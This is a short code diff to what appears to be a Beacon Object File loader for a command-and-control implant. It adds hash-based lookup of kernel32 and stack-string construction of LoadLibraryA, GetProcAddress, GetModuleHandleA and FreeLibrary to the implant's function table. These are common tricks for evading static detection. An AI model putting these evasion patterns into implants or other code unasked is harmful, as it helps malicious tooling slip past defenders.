@@ -593,6 +593,12 @@ char* BeaconGetOutputData(int* outsize) {
 
 void SetInternalFunctions(char **internalAddressArray){
 
+  UINT64 kernel32DLL = GetLoadedLibrary(CRYPTED_HASH_KERNEL32);
+  CHAR loadLibraryAString[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
+  CHAR getProcAddressString[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's' , 's', 0 };
+  CHAR getModuleHandleAString[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd' , 'l', 'e', 'A', 0 };
+  CHAR freeLibraryString[] = { 'F', 'r', 'e', 'e', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 0 };
+
   internalAddressArray[0] = (char*)BeaconDataParse;
   internalAddressArray[1] = (char*)BeaconDataInt;
   internalAddressArray[2] = (char*)BeaconDataShort;
@@ -616,4 +622,8 @@ void SetInternalFunctions(char **internalAddressArray){
   internalAddressArray[20] = (char*)BeaconInjectTemporaryProcess;
   internalAddressArray[21] = (char*)BeaconCleanupProcess;
   internalAddressArray[22] = (char*)toWideChar;
+  internalAddressArray[23] = (char*)GetSymbolAddress(kernel32DLL, loadLibraryAString);
+  internalAddressArray[24] = (char*)GetSymbolAddress(kernel32DLL, getProcAddressString);
+  internalAddressArray[25] = (char*)GetSymbolAddress(kernel32DLL, getModuleHandleAString);
+  internalAddressArray[26] = (char*)GetSymbolAddress(kernel32DLL, freeLibraryString);
 }
